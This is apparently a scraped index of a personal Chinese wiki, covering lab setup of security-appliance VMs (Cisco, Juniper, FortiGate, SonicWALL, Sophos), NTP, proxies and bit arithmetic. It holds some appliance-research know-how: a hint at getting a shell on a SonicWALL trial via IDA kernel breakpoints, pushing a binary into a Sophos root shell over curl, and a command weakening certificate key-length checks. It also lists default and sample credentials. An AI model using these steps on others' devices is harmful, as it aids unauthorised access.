Evaluation, PSN or PxGrid)”。 或者这个Cisco ISE Software Version 3.3 full installation. This ISO file can be used for installing ISE on SNS-36x5, SNS-37x5 Appliances, SNS-36x5 Servers as well as a VM installation on VMWare.，是个iso文件，VM安装时自定义安装，和ACS过程类似。 使用VM打开ova，Eval，评估版 把2-6的网络适配器删掉，只留下一个，NAT模式 setup 和ACS安装过程类似 配置项 内容 备注 name ISE IP address 192.168.147.192 netmask 255.255.255.0 gateway 192.168.147.2 DNS domain cisco.com 不能是ip地址 primary nameserver 8.8.8.8 secondary nameserver 192.168.147.2 NTP Enter 就是默认的 system timezone Enter SSH Y username admin password P@ssw0rd CLI常用命令 Cisco ISE的CLI（命令行接口）中有许多常用的命令，这些命令可以帮助您管理和维护您的ISE设备。以下是一些常用的命令： show application status ise：这个命令用于显示ISE应用的状态。它可以告诉您哪些服务正在运行，哪些服务已经停止。 application start ise：这个命令用于启动ISE应用。 application stop ise：这个命令用于停止ISE应用。 show running-config：这个命令用于显示当前的运行配置。 show version：这个命令用于显示ISE的版本信息。 为了能够访问web界面，以下的进程需要处于running状态： Application Server：这是ISE的主要服务，负责处理所有的认证和授权请求。 Database：这是ISE的数据库服务，存储所有的配置和运行数据。 Administration ISE：这是ISE的管理服务，负责提供web界面。 账号和密码就是setup时设置的。默认就是90天试用期"},{"title":"Cisco ACS","path":"/wiki/network_security_devices_env/Cisco_ACS.html","content":"VM下载和lic申请 产品网址：Cisco Secure Access Control System - Cisco。现官方已不提供支持，最新版本5.8.1.4。官方的下载页面： ACS 5.8.1 Application Upgrade Package：这是一个应用升级包，用于将您现有的Cisco ACS软件升级到5.8.1版本。 ACS 5.8.1 USB Installation tool for UCS-3415/3495 and UCS-3515/3595：这是一个USB安装工具，专为UCS-3415/3495和UCS-3515/3595设备设计，用于在这些设备上安装ACS 5.8.1。 ACS 5.8.1 FCS Official Version：这是ACS 5.8.1的正式版本，FCS代表“首次客户出货”，意味着这是向客户提供的正式发布版本。 点击第三个进行下载，填完公司信息后还是不能下 找个第三方下载，解压后得到一个iso文件，一个lic文件 第三方下载网址的评论区可以看到这个lic已经过期了，需要自己申请。 申请lic 参考： How to Generate a Demo or Evaluation License for Identity Services Engine (ISE) How to get Cisco ACS trial license https://www.cisco.com/go/license 登录账号 搜access c，选 点下载，邮箱中也会收到 安装 参考： Installation and Upgrade Guide for Cisco Secure Access Control System 5.8.1 How to Install Cisco ACS In VMware Workstation- Part 1 Initial Configuration Of ACS 5.8 In Vmware Workstation Part 2 用VM创建自定义虚拟机， 或CentOS 7 x64，也可以 处理器这里我选的数量1，内核数量2 RAM，文档说最少4GB 其余默认，点下一步 磁盘文档说最少60GB，最大可以到750G，我这里选的60GB. 快完成前CD/DVD，选择iso文件。 随后开机。 选项1是为使用键盘和显示器的安装设计的,如果您正在使用键盘和显示器进行安装，那么选择选项1; 选项2是为使用串行控制台的安装设计的。串行控制台通常用于远程管理或者没有直接物理接入的情况,如果您正在使用串行控制台进行安装，那么选择选项2。 选择选项1 setup 输入setup，[Enter]，进入配置界面 配置项 内容 备注 name ACS IP address 192.168.147.191 netmask 255.255.255.0 gateway 192.168.147.2 DNS domain cisco.com 不能是ip地址 primary nameserver 8.8.8.8 secondary nameserver 192.168.147.2 NTP Enter 就是默认的 system timezone Enter SSH Y username admin password P@ssw0rd 随后会初始化网络接口，尝试连通上面配的ip/域名 如果它显示连接不到NTP服务器，而你没有同步时间的需求，选择N忽略。 随后重启，使用前面配置的账号和密码登录 显示网络接口的命令 1show interface 以下是一些常用的命令： show application status acs：这个命令用于显示ACS应用的状态。它会提供关于ACS服务是否正在运行，以及它们的运行状态的信息。 acs start 和 acs stop：这两个命令分别用于启动和停止ACS应用。 acs reset-config：这个命令用于重置ACS配置到出厂默认设置。 show running-config：这个命令用于显示当前的运行配置。 backup 和 restore：这两个命令分别用于备份和恢复ACS配置和数据。 解决高版本浏览器无法访问web界面（未成功） 参考：Unable to Access CSACS 5.3 Web Interface… VMware如何安装Cisco ACS5.3并激活 使用show application status acs命令观察到所有相关进程已处于running状态后，使用浏览器访问http://&lt;acs的ip地址&gt;却无法访问，像这样： 原因： After additional troubleshooting, it was discovered that the MS Internet Explorer patch associated with MS Security Advisory 2661254 just so happened to be the culprit. This restricts the use of certificates with RSA keys less than 1024 bits in length. The default management certificate just so happens to be 512 bits in length. 解决办法： Using FireFox, I navigated to System Administration &gt; Configuration &gt; Local Server Certificates &gt; Local Certificates. I then proceeded to add a certificate in the following steps: Select Generate Self Signed Certificate &amp; click next Populate the Certifcate Subject field with the appropriate DN information of the ACS server. Change the key length to 1024 or above. Check &quot;Management Interface: Used to authenticate the web server (GUI). Check “Replace Certificate”. Click Finish. The ACS server should then generate the new certifcate, replace the existing management certificate, and restart the ACS processes. After everything is back up, you shouldn’t have any issues in accessing the web interface. 找了一台同在NAT模式下的win7 x86的ie进行访问 默认账号：acsadmin，默认密码：default，第一次进去会被要求重置密码，按提示进行即可。改为了：P@ssw0rd。 Cisco Secure ACS License Registration链接就是之前写的https://www.cisco.com/go/license 上传先前申请的的lic文件 配置一个能用强度高点的的证书 CN=后面随便写一个，比如CN=US。 长度要大于1024 打两个√ 目前情况： 但用高版本浏览器还是访问不了。先这样，后续有需求再看 备选方案 试了在访问web页面的电脑，管理员cmd执行 1certutil -setreg chain\\minRSAPubKeyBitLength 512 重启后再次访问，还是 链接记录 User Guide for Cisco secure Access Control System 5.8.1"},{"title":"Juniper SRX设备","path":"/wiki/network_security_devices_env/Juniper_SRX设备.html","content":"样例账号密码 root/Admin@123 配置 参考：https://www.juniper.net/documentation/us/en/software/vsrx/vsrx-consolidated-deployment-guide/vsrx-contrail/topics/task/security-vsrx-cli-configuring.html https://www.cnblogs.com/lisenlin/p/10302318.html To configure the vSRX instance using the CLI: Verify that the vSRX is powered on. Log in as the root user. There is no password. Start the CLI. 12root#cliroot@&gt; Enter configuration mode. 123configure [edit]root@# Use “commit” command to apply candidate configuration as active configuration. Set the root authentication password by entering a cleartext password, an encrypted password, or an SSH public key string (DSA or RSA). 1234[edit]root@# set system root-authentication plain-text-passwordNew password: password Retype new password: password Configure the traffic interfaces. 1set interfaces ge-0/0/0 unit 0 family inet address 192.168.242.239/24 Configure the default gateway 1set routing-options static route 0.0.0.0/0 next-hop 192.168.242.1 This command creates a static route for all addresses (0.0.0.0/0) with a next hop of 192.168.242.1, which is your default gateway. dhcp： Configure the management interface. 12[edit]root@# set interfaces fxp0 unit 0 family inet dhcp-client Configure the traffic interfaces. 12[edit]root@# set interfaces ge-0/0/0 unit 0 family inet dhcp-client Configure basic security zones and bind them to traffic interfaces. 1set security zones security-zone trust interfaces ge-0/0/0.0 配置允许访问接口的哪些服务 12set security zones security-zone trust host-inbound-traffic system-services allset security zones security-zone trust host-inbound-traffic protocols all 12set security zones security-zone trust interfaces ge-0/0/0.0 host-inbound-traffic system-services allset security zones security-zone trust interfaces ge-0/0/0.0 host-inbound-traffic protocols all 查看接口信息 1show interfaces ge-0/0/0.0 配置HTTP登录、HTTPS登录、ssh登录 1set system services web-management http interface ge-0/0/0.0 12set system services web-management https system-generated-certificateset system services web-management https interface ge-0/0/0.0 1set system services ssh Verify the configuration. 123[edit]root@# commit checkconfiguration check succeeds quit或exit退出 this command displays interface-specific information like IP address and status. 1show interfaces ge-0/0/0.0 This will display all the security zones and their associated settings 1show security zones If you want to see the specific security settings for the ‘trust’ zone, you can use the command show security zones security-zone trust. This will display the interfaces associated with the trust zone and the services and protocols that are allowed inbound to the interfaces in this zone. show | display set operational mode 1show interfaces ge-0/0/0 terse 1show interfaces ge-0/0/0 detail 查看ip（如果屏幕太小，输出太多） 1ifconfig | less web管理页面 dashboard可以查看到版本 白名单机制 验证白名单机制存在： 将/bin/sh移动到/tmp/sh 1cp /bin/sh /tmp/sh 然后 1cd /tmp 1./sh 会报权限error"},{"title":"FortiGate VM","path":"/wiki/network_security_devices_env/FortiGate_VM.html","content":"概念 Fortinet是一家网络安全公司，该公司的第一个也是主要产品是物理防火墙FortiGate。 也有看到FortiFirewall（简写FFW）和FortiGate（简写FGT）的说法，没看明白。 虚拟机下载 参考：在Esxi上安装飞塔Fortigate虚拟机的教程 Fortinet技术支持中心：https://support.fortinet.com 注册账号后，选择Support-&gt;VM Images进入到虚拟机下载页面 平台选择ESXI 有四个文件，分别是FortiFirewall安装文件和升级文件，FortiGate安装文件和升级文件 “Upgrade from previous version of FortiFirewall for VMWare”：这是用于升级已有的FortiFirewall虚拟机的文件。如果你已经在VMware ESXi上运行了旧版本的FortiFirewall，你可以使用这个文件进行升级。 “New deployment of FortiFirewall for VMware”：这是用于在VMware ESXi上新部署FortiFirewall的文件。如果你打算新安装FortiFirewall，你应该下载这个文件。 “Upgrade from previous version of FortiGate for VMware”：这是用于升级已有的FortiGate虚拟机的文件。如果你已经在VMware ESXi上运行了旧版本的FortiGate，你可以使用这个文件进行升级。 “New deployment of FortiGate for VMware”：这是用于在VMware ESXi上新部署FortiGate的文件。如果你打算新安装FortiGate，你应该下载这个文件。 What is the difference between FGT and FFW ? 下载New deployment of FortiFirewall for VMware，解压后有多个ovf文件，根据自己的平台选择相应的ovf文件，在readme中可以知道每个ovf支持的ESXI和VM版本 12345678910111213141516171819Compatibilities of different OVF templates:|-----------------------------------------+-------------------------------------------|| Template | Compatible with ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.ovf | ESXI 8.0(Hardware Version 20) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.hw13.ovf | ESXI 6.5(Hardware Version 13) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.hw15.ovf | ESXI 6.7U2+(Hardware Version 15) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.hw17.ovf | ESXI 7.0(Hardware Version 17) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.vapp.ovf | ESXI 8.0(Hardware Version 20) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64.nsxt.ovf | ESXI 6.7U2+(Hardware Version 15) or later ||-----------------------------------------+-------------------------------------------|| FortiGate-VM64-ZNTA.vapp.ovf | ESXI 7.0(Hardware Version 17) or later ||-----------------------------------------+-------------------------------------------| 启动及配置 启动 载入ovf后，默认是10张网卡，从网卡1开始改为自己要用的模式，比如NAT，或其他模式。 后面license需要FGT能访外网 配置 序列号： 开机后初始账号和密码是amdin/空，第一次登录需要修改密码 已修改为：admin/123456 我将第一张网卡改成了NAT模式 show system interface：显示系统接口的信息 默认是dhcp模式，该模式下不能直接设ip，要先改为静态ip模式，完整命令如下： 123456config system interface edit port1 set mode static set allowaccess ping http https ssh telnet set ip 192.168.147.190/24 end 配置ip参考：https://cloud.tencent.com/developer/ask/sof/108409533 DNS配置 显示系统的DNS 1show system dns 修改dns 1234config system dns set primary 192.168.147.135 set secondary 192.168.147.2 end 路由配置 显示系统默认网关 1get router info routing-table all 配置路由 这一步不弄的话FortiGate没法将流量路由到互联网，会ping不通除了192.168.147.1/24其他段的ip地址，显示unreachable。 license时会curl失败 12345config router static edit 1 set gateway 192.168.147.2 set device port1 end 验证能否访问互联网 在FortiGate的命令行界面（CLI）中，你可以使用以下命令来验证FortiGate是否能访问互联网： execute ping &lt;IP地址或域名&gt;：这个命令可以用来测试FortiGate是否能够到达指定的IP地址或域名。例如，你可以输入execute ping 8.8.8.8或execute ping www.google.com来测试是否能够访问Google的DNS服务器或网站。 execute traceroute &lt;IP地址或域名&gt;：这个命令可以用来跟踪数据包从FortiGate到指定的IP地址或域名的路径。这可以帮助你识别网络中的问题。 请注意，FortiGate CLI并不支持curl命令。如果你需要测试HTTP连接，你可能需要使用其他工具或方法。 用浏览器访问https://192.168.147.190:443，账户密码和CLI一样 full license 个人中心，Register Now 输入在虚拟机中看到的序列号，非政府用户 输入时说我的序列号无效？？？ https://docs.fortinet.com/document/fortigate-private-cloud/7.4.0/kvm-administration-guide/170480/fortigate-vm-models-and-licensing evaluation license 输入注册的账号和密码，点击OK按钮 与此同时，虚拟机显示在请求FortiCare troubleshooting如果网页报错，看一下虚拟机的报错信息。下图这种是网络配置问题：账户密码输错：已经申请过的账号，对新的一台FortiGate再次输入： 注册成功后账号中心的product list会多出一栏 其他命令记录 1get system status 会显示一些关于FortiGate系统的基本信息，包括版本号、序列号、操作模式、Uptime等 FortiGate 飞塔防火墙常用命令"},{"title":"SonicWALL SMA设备","path":"/wiki/network_security_devices_env/SonicWALL_SMA设备.html","content":"官网地址 登录页面 https://www.mysonicwall.com/ 产品试用： 尝试能否连接到许可证服务器 https://www.sonicwall.com/support/knowledge-base/error-license-manager-ssl-connection-failed-please-check-your-internet-connection-and-dns-settings/170502913153712/ 桥接，复制到网络连接。手机开热点，实体电脑连手机热点 system&gt;license，输入账号和密码，然后填内容 默认密码 网页：443 默认密码： admin/password ssh：root/password 试用版不开放ssh，可以ida断点内核进去拿shell 升级 “System”-“Settings” 上传sig文件，boot这个sig文件，不恢复默认配置 ovf及sig文件下载 参考链接：https://www.sonicwall.com/support/knowledge-base/how-to-download-sra-smb-ova-file-for-your-virtual-appliance-from-mysonicwall/170502718367497/ 日志查看 开二次验证 参考：https://www.sonicwall.com/support/knowledge-base/how-do-i-configure-2fa-for-ssl-vpn-with-totp/190829123329169/ 经典模式"},{"title":"Sophos Firewall","path":"/wiki/network_security_devices_env/Sophos_Firewall.html","content":"安装 Sophos Firewall offers a virtual machine version, and the documentation can be found at this link. You need to register an account to download the ovf file.After downloading the compressed file, you will find different OVF files with different names, each of them prepared for different virtual platforms. Here’s a brief description of each one: sf_virtual.ovf - This is the standard OVF file for use with VMware vSphere. It includes support for the VMware virtual hardware version 10. sf_virtual_vm7.ovf - This OVF file is for use with VMware Workstation 7 and VMware Player 3. It includes support for the VMware virtual hardware version 7. sf_virtual_vm8.ovf - This OVF file is for use with VMware Workstation 8 and later versions, including VMware Player 4 and later versions. It includes support for the VMware virtual hardware version 8. sf_virtual_vm8_paravirtual.ovf - This OVF file is for use with VMware Workstation 8 and later versions, including VMware Player 4 and later versions. It includes support for the VMware virtual hardware version 8 and includes the VMware Paravirtual SCSI controller. sf_virtual_virtualbox.ovf - This OVF file is for use with Oracle VirtualBox. It includes support for the VirtualBox virtual hardware version 4. To install the Sophos Firewall virtual appliance on VMware 16.1, you should use the sf_virtual_vm8.ovf file since it is compatible with VMware Workstation 8 and later versions. You can import this OVF file into VMware Workstation to create a virtual machine for the Sophos Firewall. Installation guide Sophos Firewall is designed to act as a gateway between different network segments, and having multiple network interfaces allows it to separate and manage traffic between these segments more efficiently. For example, you could have one interface connected to your LAN, another connected to your DMZ (demilitarized zone) network, and a third connected to the internet. This would allow Sophos Firewall to manage traffic between these segments and enforce security policies to protect your network. To skip the online update process, you can disconnect the network before opening the web page for the first time. LAN：192.168.242.242 WAN：192.168.147.134 用户：admin 密码：Admin@1234 Firewall name：Sophos_XG_Firewall America/Chicago admin@domainname.com Pass@forMail123 Configuration summary: 1234567891011121314151617181920212223Basic settingsHostname: Sophos_XG_FirewallTime zone: America/Chicago Network settingsInternet connection: DHCP on PortBLocal network: PortAIP: 192.168.242.242/255.255.255.0DHCP disabled #Default_Network_Policy has been created with:Scan HTTP: EnableUse zero-day protection: EnableWeb policy: Default PolicyIntrusion prevention: lantowan_generalCreated linked NAT rule &quot;#NAT_Default_Network_Policy&quot; with source translated to MASQ. Notifications and backups:Send configuration backup every week: EnableBuilt-in email serverRecipient&#x27;s email address: admin@domainname.comSender&#x27;s email address: admin@domainname.com ssh权限 5-3，进入shell。 用winscp没法传文件： ssh后终端是root权限，WinSCP登录后是admin。admin还是和root不一样。我试了用WinSCP传输报错error3，permission denied。 换一种方法：起http服务传 在工具目录用python2起一个http服务 1python -m SimpleHTTPServer 8080 然后root终端中用curl下载这个二进制文件 1curl 192.168.242.129:8080/demo -o demo 没加-o的报错 1234SF01V_VM01_SFOS 19.5.1 MR-1-Build278# curl 192.168.242.129:8080/demoWarning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tellWarning: curl to output it to your terminal anyway, or consider &quot;--outputWarning: &lt;FILE&gt;&quot; to save to a file. 或者wget（还没试过） 目前已知的两个有执行权限的目录：/var/或/content/下 shell命令 查看权限，没有whoami命令，可以用id查看 升级 web页面，Backup&amp;firmware，有两种升级方式 方式一：自行上传firmware 方式二：从网络上下载firmware，然后install（使用VPN下载速度会快） both of these options can be considered upgrades, but they serve slightly different purposes: Manually Uploading Firmware and Switching Partitions: This feature allows administrators to manually download a specific firmware version from the Sophos website (or any other source), and then upload it to the firewall. This can be useful in scenarios where the firewall does not have direct internet access to download the latest firmware or when a specific firmware version is required. Switching partitions refers to the process of changing the active firmware partition. Sophos XG Firewalls generally maintain two firmware partitions - one for the active firmware and one for the auxiliary firmware. This allows a backup firmware to be stored and readily available in case there’s an issue with the active firmware. Latest Available Firmware: This feature is more straightforward. The firewall itself checks for the latest available firmware from Sophos, downloads it, and then installs it. This requires that the firewall has internet access. This option is generally more convenient and ensures that the firewall is always up-to-date with the latest security patches and features. 参考： web后台-Backup&amp;firmware https://www.t-tech.com.tw/b1page-b1_25035-b1--1545.html https://doc.sophos.com/nsg/sophos-firewall/18.5/Help/en-us/webhelp/onlinehelp/AdministratorHelp/BackupAndFirmware/Firmware/FirmwareMoveToDifferentVersion/index.html#introduction 日志 View the log： LogView：Diagnostics-&gt;Tools-&gt;Log viewer 配置一件ACL并让日志管理器记录它： Administration-Device access Local service ACL exception rule ADD 这条ACL规则为禁止来源ip为192.168.242.147来ping Sophos WALL XG &quot;System services&quot;-“Log settings”，在这里配置记录“Local ACLs”事件"},{"title":"chrony时间服务器","path":"/wiki/linux_env/chrony时间服务器.html","content":"前言 有台linux需要做时间同步，但无法连外网，只能搭个内网NTP服务器，让它与内网NTP服务器做时间同步。 如果能连网，配置文件中本身有默认的时间源，也可以自己改。 文章环境 centos 1234[root@localhost squid]# cat /etc/redhat-releaseCentOS Linux release 7.9.2009 (Core)[root@localhost user]# uname -aLinux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 介绍 Chrony有两个核心组件，分别是： chronyd：是守护进程，主要用于调整内核中运行的系统时间和时间服务器同步。它确定计算机增减时间的比率，并对此进行调整补偿 chronyc：提供一个用户界面，用于监控性能并进行多样化的配置。它可以在chronyd实例控制的计算机上工作，也可以在一台不同的远程计算机上工作。 chrony安装 系统已默认安装。 1yum install chrony -y 启动并加入开机自启动。 123systemctl enable chronyd.servicesystemctl restart chronyd.servicesystemctl status chronyd.service 防火墙设置 12firewall-cmd --add-service=ntp --permanentfirewall-cmd --reload 因NTP使用123/UDP端口协议，所以允许NTP服务即可。 关闭SELinux 临时关闭 1setenforce 0 永久关闭 修改配置文件/etc/selinux/config,将其中SELINUX设置为disabled 12- SELINUX=enforcing + SELINUX=disabled 重启生效，使用sestatus查看SELinux状态 默认配置文件及解读 1cat /etc/chrony.conf 原版注释版123456789101112131415161718192021222324252627282930313233343536373839# These servers were defined in the installation:server 0.centos.pool.ntp.org iburstserver 1.centos.pool.ntp.org iburstserver 2.centos.pool.ntp.org iburstserver 3.centos.pool.ntp.org iburst# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# 使用pool.ntp.org项目中的公共服务器。以server开头，理论上你想添加多少时间服务器都可以。# These servers were defined in the installation:server 0.centos.pool.ntp.org iburstserver 1.centos.pool.ntp.org iburstserver 2.centos.pool.ntp.org iburstserver 3.centos.pool.ntp.org iburst# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).# 根据实际时间计算出服务器增减时间的比率，然后记录到一个文件中，在系统重启后为系统做出最佳时间补偿调整。# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# chronyd根据需求减慢或加速时间调整，# 在某些情况下系统时钟可能漂移过快，导致时间调整用时过长。# 该指令强制chronyd调整时期，大于某个阀值时步进调整系统时钟。# 只有在因chronyd启动时间超过指定的限制时（可使用负值来禁用限制）没有更多时钟更新时才生效。# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# 将启用一个内核模式，在该模式中，系统时间每11分钟会拷贝到实时时钟（RTC）。# Enable kernel synchronization of the real-time clock (RTC).rtcsync# 通过使用hwtimestamp指令启用硬件时间戳# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# 指定一台主机、子网，或者网络以允许或拒绝NTP连接到扮演时钟服务器的机器# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.# 指定包含NTP验证密钥的文件。# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# 指定日志文件的目录。# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking 一个例子 修改配置文件如下： 1vi /etc/chrony.conf 注释掉外部时钟，因为内网环境，上不了网。增加自身ip作为时钟服务器。 allow命令指允许哪些ip通过访问到自己。 local stratum 10指当外部时钟访问不到时，允许自身作为时钟服务器来校准客户端 123456789101112131415161718192021222324252627282930313233343536373839404142# These servers were defined in the installation:+ #server 0.centos.pool.ntp.org iburst+ #server 1.centos.pool.ntp.org iburst+ #server 2.centos.pool.ntp.org iburst+ #server 3.centos.pool.ntp.org iburst+ server 192.168.147.201 iburst# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16+ allow 192.168.147.0/24 # Serve time even if not synchronized to a time source.+ local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics tracking 重启chrony 1systemctl restart chronyd.service 外网的话，可以注释掉那四个server，然后加个阿里云的时间源server ntp.aliyun.com iburst，其余步骤一样 客户端使用效果 修改配置文件 1vi /etc/chrony.conf 注释掉4个外部时钟，添加192.168.147.201作为时钟 123456789101112131415161718192021222324252627282930313233343536373839# Use public servers from the pool.ntp.org project.# Please consider joining the pool (http://www.pool.ntp.org/join.html).+ #server 0.centos.pool.ntp.org iburst+ #server 1.centos.pool.ntp.org iburst+ #server 2.centos.pool.ntp.org iburst+ #server 3.centos.pool.ntp.org iburst+ server 192.168.147.201 iburst# Record the rate at which the system clock gains/losses time.driftfile /var/lib/chrony/drift# Allow the system clock to be stepped in the first three updates# if its offset is larger than 1 second.makestep 1.0 3# Enable kernel synchronization of the real-time clock (RTC).rtcsync# Enable hardware timestamping on all interfaces that support it.#hwtimestamp *# Increase the minimum number of selectable sources required to adjust# the system clock.#minsources 2# Allow NTP client access from local network.#allow 192.168.0.0/16# Serve time even if not synchronized to a time source.#local stratum 10# Specify file containing keys for NTP authentication.#keyfile /etc/chrony.keys# Specify directory for log files.logdir /var/log/chrony# Select which information is logged.#log measurements statistics trackin 重启chrony 1systemctl restart chronyd.service 使用以下命令查看同步状态，其中“^*” 代表时间已经正确同步 1chronyc sources -v 参考 详解：Linux Chrony 设置服务器集群同步时间"},{"title":"TMG代理服务器","path":"/wiki/proxy_server_building/TMG代理服务器.html","content":"ISA升级版，但太老了。现在基本没人用了 虚拟机清单 虚拟机 用途 网卡数量及用途 样例 winserver2008 TMG代理 1张桥接/NAT模式（表示能上网的卡），1张host-only模式（表示内网网卡） LAN：192.168.242.220\tWAN：192.168.147.133 内网主机 内网主机 1张网卡，host-only模式，表示内网网卡 192.168.242.221 TMG代理服务器安装 VM配置 TMG安装 forefront_threat_management_gateway.iso解压后拖入winserver2008中 双击autorun.exe运行， 运行准备工具，均默认，点击下一步 弹出Forefront TMG企业安装向导，添加适配器，添加lan网卡 其余默认，下一步，至此，安装完成 参考网址：https://blog.51cto.com/loveunicom/395977 https://blog.51cto.com/hznethome/1543825 https://blog.51cto.com/hznethome/1544809 网络配置 参考网址：https://blog.51cto.com/hznethome/1545304 https://blog.51cto.com/nickzp/1322442（该网址选看） 点击‘配置网络设置’ 边缘防火墙 点击‘配置系统设置’ 搭一个简单的，不在域中，就默认工作组 点击‘定义部署选项’ 配置完成 web访问策略向导 默认 实体机最好启用，虚拟机不启用 新建规则内网互访 新增规则，内网互访： 因为TMG服务器没在域中，选所有用户 新建规则后，记得点击“应用” 配置后内网主机可以互访，配置前是ping不通的 新建规则WEB代理 新建规则，配置WEB代理，让客户端正常访问外网： 记得点应用 内网主机使用代理上网 内网主机配置为TMG代理服务器，然后就可以上网啦！"},{"title":"小结","path":"/wiki/representation_and_computation_of_data/小结.html","content":"在这个系列中，我们先讲了进制的概念。N进制的定义：由N个符号组成，这N个符号可以自由定义，逢N进一。（自定义符号的思想，用于加密中）由于十进制的思维方式根深蒂固，使我们难以看到本质：每一种进制都是完美的，不需要依靠转换其他进制来做运算。运算的本质就是查数，把数全写出来，然后往后查。如果数字特别大，为了方便，就制作加法表，减法表，乘法表，除法表，以这四个表为基础，就能在这个进制的体系中做运算。 随后，我们讲了数据宽度的概念。由于计算机硬件的限制，数据是有宽度的，超过宽度的部分会被舍弃。将数字存进计算机后，这个数表示什么意思，怎么解释呢？对于计算机而言，存储的数字只有0和1，而如何使用（解释）这些数据，取决于程序员的视角。假设数据宽度是1个字节，范围0~F，如果我想全部表示正数，那这16个数分别对应正数0-16；如果我既想表示正数又想表示负数，那就将这16个数分一半，0-7表示正数，8-F表示负数。海哥的这种理解方式，就不用原码反码补码的知识。 计算机中存储了这些数后，如果作运算呢？深入点的内容是数字电路方面的知识，海哥这里简化了，用位运算讲解。计算机只会位运算：与、或、异或、非、左移、右移，然后用这些位运算来实现四则运算加减乘除，比如用异或，与，左移这三个位运算来完成加法的操作。再用四则运算，表示数学中更复杂的运算。"},{"title":"位运算","path":"/wiki/representation_and_computation_of_data/位运算.html","content":"位运算 计算机只认识0和1，计算机能做的运算归根结底也就是直接对0和1做运算(通常称为位运算)，举例来说：2+3= ?2-3=?计算机都是通过位运算实现的! 与 两个位都为1，结果才为1 用途：掩码mask。取出某个数的第几位 或 只要有一个为1就为1 异或 不一样时为1 非 取反 左移 逻辑左移SHL，目的操作数左移若干位，最高位移入进位标志位CF，低位补0 算数左移SAL，目的操作数左移若干位，最高位移入进位标志位CF，低位补0 逻辑左移和算数左移一样，低位补0，没区别 右移 逻辑右移SHR，目的操作数右移若干位，最高位补0，最低位移入进位标志位CF 算数右移SAR，目的操作数右移若干位，最高位补符号位，最低位移入进位标志位CF 例 1shr 11010101 运行后为00110101 对应C语言： 12unsigned int a=10;printf(&quot;%d &quot;,a&gt;&gt;2); 1sar 11010101 运行后为11110101 对应C语言： 12int a=10;printf(&quot;%d &quot;,a&gt;&gt;2); 通过位运算实现四则运算 计算机只认识0和1，也只会做位运算。 连最基本的加、减、乘、除都无法直接计算，而是要通过位运算间接来实现。 加 算法： A和B两个数异或，得出结果x A和B两个数与操作，得出结果y a. 如果结果为0，表示不存在进位，上一步骤异或的结果x就是最后结果 b. 如果结果为1，表示存在进位，要继续进行异或运算 A&lt;–x，B&lt;–(y&lt;&lt;1)，重复步骤1，至到为a情况 左移一位的原因：进位是往前进一位 思想： 不考虑进位的话，异或的结果和按位加结果是一样的；再用与处理进位 综上，用异或相加（不考虑进位的情况下），用与处理进位 4+5运算过程： 第一轮运算： A 0000 0100 A 0000 0100 B 0000 0101 B 0000 0101 异或 0000 0001 与 0000 0100 因为与的结果不为0，运算继续 第二轮运算： A=0000 0001（异或的结果） B=0000 1000（与的结果左移1位） A 0000 0001 A 0000 0001 B 0000 1000 B 0000 1000 异或 0000 1001 与 0000 0000 与的结果为0。 异或的结果就是最终结果：0000 1001 减 因为用的补码存储，加法减法的运算过程统一了。所以和加法一样。 4-5运算过程： 4-5=4+(-5) 第一轮运算： 判断是否有进位 A 0000 0100 A 0000 0100 B 1111 1011 B 0000 1011 异或 1111 1111 与 0000 0000 与的结果为0。 异或的结果就是最终结果：1111 1111 乘法 X*Y的本质就是加法，Y个X相加。 除法 X/Y的本质就是减法，X能减去多少个Y 作业 八进制数2-5在计算器中的的结果是：1777777777777777777775为什么？ 答案计算机只能做加法，所以2-5就是2+(-5)0010+1011第一轮运算：A0010A0010B1011B1011异或1001与0010因为与的结果不为0，运算继续第二轮运算：A=1001（异或的结果）B=0100（与的结果左移1位）A1001A1001B0100B0100异或1101与0000与的结果为0。异或的结果就是最终结果：1101如果是DWORD存储，就是1111 1111 1111 1111 1111 1111 1111 1101十六进制就是FFFFFFFD八进制就是1 777 777 777 777 777 777 775其实就是算下来是-1，只不过用八进制表示，让人一看起来就不知所以。"},{"title":"squid内网认证代理服务器","path":"/wiki/proxy_server_building/squid认证代理服务器搭建.html","content":"参考 搭建需要身份认证的 Squid 代理 Linux搭建squid服务实现内网机器代理上网 拓展阅读 万字长文带你了解最常用的开源 